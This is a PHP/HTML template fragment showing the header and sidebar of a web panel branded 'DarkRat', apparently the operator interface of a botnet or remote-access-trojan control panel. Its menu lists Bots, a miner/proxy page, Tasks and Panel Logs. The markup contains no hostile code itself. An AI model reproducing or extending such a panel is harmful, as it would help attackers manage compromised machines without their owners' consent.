<header class="header">   
      <nav class="navbar navbar-expand-lg">
  
        <div class="container-fluid d-flex align-items-center justify-content-between">
          <div class="navbar-header">
            <!-- Navbar Header--><a href="?p=dashboard" class="navbar-brand">
              <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">Dark</strong><strong>Rat</strong> </div>
              <div class="brand-text brand-sm"><strong class="text-primary">D</strong><strong>R</strong></div></a>
            <!-- Sidebar Toggle Btn-->
            <button class="sidebar-toggle"><i class="fa fa-long-arrow-left"></i></button>
          </div>            
           <!-- Log out  -->
            <div class="list-inline-item logout">                   <a id="logout" href="?p=logout" class="nav-link">Logout <i class="icon-logout"></i></a></div>
          </div>
        </div>
      </nav>
    </header>
    <div class="d-flex align-items-stretch">
        <!-- Sidebar Navigation-->
        <nav id="sidebar">
            <!-- Sidebar Header-->
            <br>
            <!-- Sidebar Navidation Menus--><span class="heading">Main</span>
            <ul class="list-unstyled">
                <li class="<?php echo isActivePage("dashboard"); ?>"><a href="?p=dashboard"> <i class="icon-home"></i>Dashboard </a></li>
                <li class="<?php echo isActivePage("bots"); ?>"><a href="?p=bots"><i class="fa fa-diamond" aria-hidden="true"></i>Bots </a></li>
                <li class="<?php echo isActivePage("minerpanel"); ?>"><a href="?p=minerpanel"><i class="fa fa-diamond" aria-hidden="true"></i>ProxyPanel </a></li>
                <li class="<?php echo isActivePage("tasks"); ?>"><a href="?p=tasks"><i class="fa fa-tasks" aria-hidden="true"></i>Tasks </a></li>
                <li class="<?php echo isActivePage("settings"); ?>"><a href="?p=settings"><i class="fa fa-wrench" aria-hidden="true"></i>Settings </a></li>
                <li class="<?php echo isActivePage("users"); ?>"><a href="?p=users"><i class="fa fa-users" aria-hidden="true"></i>User Management </a></li>
                <li class="<?php echo isActivePage("logs"); ?>"><a href="?p=logs"> <i class="fa fa-low-vision" aria-hidden="true"></i>Panel Logs </a></li>


            </ul>
        </nav>
        <!-- Sidebar Navigation end-->